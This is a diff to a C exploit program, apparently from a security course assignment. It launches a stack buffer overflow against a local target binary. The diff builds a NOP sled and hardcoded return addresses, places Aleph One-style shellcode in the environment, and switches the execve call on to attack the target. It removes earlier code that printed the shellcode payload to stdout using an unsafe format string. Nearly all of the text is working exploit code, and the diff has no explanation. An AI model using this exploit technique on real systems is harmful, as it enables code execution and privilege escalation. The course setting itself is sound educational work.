@@ -15,6 +15,8 @@ int main(void)
   char str[20];
   memset(str, 0, 20);
 
+  // fake RET + fake SFP
+  // \x9f\xff\xff\xbf
   for (int i = 0; i < 16; i++)
   {
   	strcat(str, "\x90");
@@ -23,7 +25,7 @@ int main(void)
   // strcat(str, "\x97\xff\xff\xbf");
   // env: 0xbfffff97:	0xdb31c031
 
-  strcat(str, "\xe9\xff\xff\xbf\xe9\xff\xff\xbf");
+  // strcat(str, "\xe9\xff\xff\xbf\xe9\xff\xff\xbf");
 
   args[0] = TARGET;
   // max input size is 4 * 5 = 20
@@ -31,19 +33,8 @@ int main(void)
   args[2] = NULL;
   
   env[0] = shellcode;
-  // execve(TARGET, args, env);
-  // fprintf(stderr, "execve failed.\n");
-
-  char *preface = "shellcode=";
-  char *envvar = malloc(sizeof(preface)+sizeof(shellcodeAlephOne)+16);
-  strcat(envvar, preface);
-  strcat(envvar, "AAAA");
-  strcat(envvar, "\x97\xff\xff\xbf");
-  strcat(envvar, shellcodeAlephOne);
-  strcat(envvar, "\0");
-  // printf("%s", envvar);
-  fprintf(stdout, envvar);
-  free(envvar);
+  execve(TARGET, args, env);
+  fprintf(stderr, "execve failed.\n");
   return 0;
 }
 
